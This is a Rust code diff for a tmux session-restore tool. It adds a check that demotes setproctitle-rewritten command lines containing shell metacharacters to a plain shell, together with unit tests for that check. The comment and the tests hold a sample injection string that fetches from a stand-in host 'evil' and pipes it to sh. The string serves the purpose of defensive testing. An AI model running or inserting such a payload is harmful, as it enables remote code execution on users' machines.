@@ -43,10 +43,10 @@ pub fn save(name: Option<&str>) -> Result<()> {
 
     let stamp = chrono::Local::now().format("%H:%M");
     tmux::set_global_option("@anka_status", &format!("✔ {stamp}"));
-    println!(
+    crate::notify::success(&format!(
         "saved snapshot '{name}' ({} sessions)",
         snap.sessions.len()
-    );
+    ));
     Ok(())
 }
 
@@ -153,17 +153,37 @@ fn display(fmt: &str) -> Option<String> {
 }
 
 fn resolve_restore(cfg: &Config, p: &PaneRaw) -> RestoreAction {
-    if p.command == "nvim" || p.command == "vim" {
+    classify_restore(cfg, &p.command, process::foreground_command(p.pid))
+}
+
+/// Decide how a pane will be restored, given its tmux-reported command and
+/// the `/proc` foreground command line (`(line, verbatim)`).
+///
+/// A *verbatim* line (single-element, setproctitle-rewritten) carries no
+/// quoting, and restore types it straight into a shell — a process could
+/// retitle itself to `npm exec x; curl evil|sh`, whose basename passes the
+/// allowlist. Such lines are only replayable when they contain no shell
+/// metacharacters ([`process::verbatim_safe`]); otherwise the pane is demoted
+/// to a plain shell like any non-allowlisted command — unless the user opts
+/// in with `@anka-restore-verbatim on`.
+fn classify_restore(cfg: &Config, pane_command: &str, fg: Option<(String, bool)>) -> RestoreAction {
+    let replayable =
+        |cmd: &str, verbatim: bool| !verbatim || cfg.restore_verbatim || process::verbatim_safe(cmd);
+    if pane_command == "nvim" || pane_command == "vim" {
         // Capture the full argv (the files being edited) so restore reopens
         // them; the `session` strategy may instead resume a Session.vim.
+        // The same verbatim gate applies — an unsafe line degrades to a bare
+        // editor launch rather than a shell injection.
         return RestoreAction {
             kind: RestoreKind::Nvim,
-            command: process::foreground_command(p.pid),
+            command: fg.filter(|(c, v)| replayable(c, *v)).map(|(c, _)| c),
         };
     }
-    if let Some(full) = process::foreground_command(p.pid) {
+    if let Some((full, verbatim)) = fg {
         let base = process::base_name(&full);
-        if cfg.restore_processes.iter().any(|w| w == base || *w == p.command) {
+        if cfg.restore_processes.iter().any(|w| w == base || *w == pane_command)
+            && replayable(&full, verbatim)
+        {
             return RestoreAction {
                 kind: RestoreKind::Process,
                 command: Some(full),
@@ -443,5 +463,75 @@ mod tests {
         prune_stale_panes(&dir, &snap);
         assert!(!dir.join("panes/1.txt").exists());
         fs::remove_dir_all(&dir).ok();
+    }
+
+    // ── verbatim setproctitle gating (injection persistence) ─────────────────
+
+    fn cfg(restore_verbatim: bool) -> Config {
+        Config {
+            capture_pane_contents: false,
+            restore_processes: "ssh psql mysql sqlite3 npm yarn nvim"
+                .split_whitespace()
+                .map(String::from)
+                .collect(),
+            strategy_nvim: "session".to_string(),
+            save_interval_mins: 0,
+            restore_on_start: false,
+            restore_overwrite: false,
+            switch_preview: false,
+            zoxide: false,
+            save_generations: 0,
+            history_limit: 0,
+            restore_verbatim,
+        }
+    }
+
+    #[test]
+    fn safe_verbatim_allowlisted_command_is_replayed() {
+        let r = classify_restore(&cfg(false), "nvim", Some(("nvim file.txt".into(), true)));
+        assert_eq!(r.kind, RestoreKind::Nvim);
+        assert_eq!(r.command.as_deref(), Some("nvim file.txt"));
+
+        let r = classify_restore(&cfg(false), "node", Some(("npm exec some-pkg".into(), true)));
+        assert_eq!(r.kind, RestoreKind::Process);
+        assert_eq!(r.command.as_deref(), Some("npm exec some-pkg"));
+    }
+
+    #[test]
+    fn unsafe_verbatim_line_is_demoted_to_shell_by_default() {
+        // A process retitled itself into a compound command: basename ("npm")
+        // passes the allowlist, but replaying would run `curl evil|sh`.
+        let evil = "npm exec x; curl evil|sh";
+        let r = classify_restore(&cfg(false), "node", Some((evil.into(), true)));
+        assert_eq!(r.kind, RestoreKind::Shell);
+        assert_eq!(r.command, None);
+        // Same for an editor pane: degrade to a bare launch, never inject.
+        let r = classify_restore(&cfg(false), "nvim", Some((format!("nvim a.txt; {evil}"), true)));
+        assert_eq!(r.kind, RestoreKind::Nvim);
+        assert_eq!(r.command, None);
+    }
+
+    #[test]
+    fn unsafe_verbatim_line_is_allowed_when_opted_in() {
+        let evil = "npm exec x; curl evil|sh";
+        let r = classify_restore(&cfg(true), "node", Some((evil.into(), true)));
+        assert_eq!(r.kind, RestoreKind::Process);
+        assert_eq!(r.command.as_deref(), Some(evil));
+    }
+
+    #[test]
+    fn quoted_multi_element_argv_with_metachars_is_still_replayed() {
+        // Not verbatim: reconstruct() shell-quoted each element, so the `||`
+        // lives inside quotes — restoring ssh sessions must keep working.
+        let ssh = "ssh grid -t 'byobu has -t k || byobu new -s k'";
+        let r = classify_restore(&cfg(false), "ssh", Some((ssh.into(), false)));
+        assert_eq!(r.kind, RestoreKind::Process);
+        assert_eq!(r.command.as_deref(), Some(ssh));
+    }
+
+    #[test]
+    fn non_allowlisted_command_stays_shell() {
+        let r = classify_restore(&cfg(false), "top", Some(("top -b".into(), true)));
+        assert_eq!(r.kind, RestoreKind::Shell);
     }
 }
